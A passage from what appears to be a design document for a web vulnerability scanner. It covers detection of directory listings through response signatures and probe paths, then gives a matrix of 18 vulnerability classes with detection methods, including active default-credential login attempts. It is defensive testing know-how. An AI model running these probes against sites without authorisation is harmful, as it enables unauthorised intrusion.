   - IIS: `<pre><A HREF=`, `[To Parent Directory]`
   - Generic: `Parent Directory`, `Last modified`, `<dir>`, file listings with sizes and dates
4. **Verify** by checking that the response contains hyperlinks to actual files (not a custom index page).
5. **Report** with the directory URL and the list of exposed files/directories.

### What the response signature looks like
- Response body contains `Index of /` in a title or heading.
- Response body contains `Parent Directory` link.
- Response body contains a list of hyperlinked filenames with sizes and modification dates.
- HTTP status `200`.

### False positive risk: **Low**
- **Mitigation**: Match on the specific directory listing patterns (not just the word "Index"). Verify the presence of file hyperlinks in the listing.

### Starter payloads (paths)
```
/
/images/
/uploads/
/backup/
/assets/
```

---

## Summary Matrix

| # | Vulnerability | Detection Type | Confidence | FP Risk | Phase |
|---|--------------|---------------|------------|---------|-------|
| A | Reflected XSS | Active — payload reflection | High | Low | 1 |
| B | Stored XSS | Active — submit & re-crawl | Medium | Medium | 2 |
| C | DOM XSS | Static + Dynamic (browser) | Low–High | High–Low | 2 |
| D | SQLi — Error-based | Active — error pattern matching | High | Low | 1 |
| E | SQLi — Time-based blind | Active — response timing | High | Medium | 1 |
| F | SQLi — Boolean-based blind | Active — response comparison | High | Medium | 1 |
| G | SSRF | Active — OOB + content matching | High | Low–Med | 1 |
| H | SSTI | Active — computation check | High | Low | 1 |
| I | Path Traversal / LFI | Active — file content matching | High | Low | 1 |
| J | Open Redirect | Active — redirect header check | High | Low | 1 |
| K | Command Injection | Active — output + timing | High | Low | 1 |
| L | XXE | Active — file read + OOB | High | Low | 1 |
| M | CORS Misconfig | Active — origin header probe | High | Low | 1 |
| N | Sensitive Data Exposure | Passive — response scanning | Medium | Med–High | 1 |
| O | Security Headers | Passive — header checks | High | Low | 1 |
| P | Default Credentials | Active — login attempts | High | Low | 2 |
| Q | Exposed Admin Panels | Active — path probing | High | Low | 1 |
| R | Directory Listing | Active — path probing | High | Low | 1 |
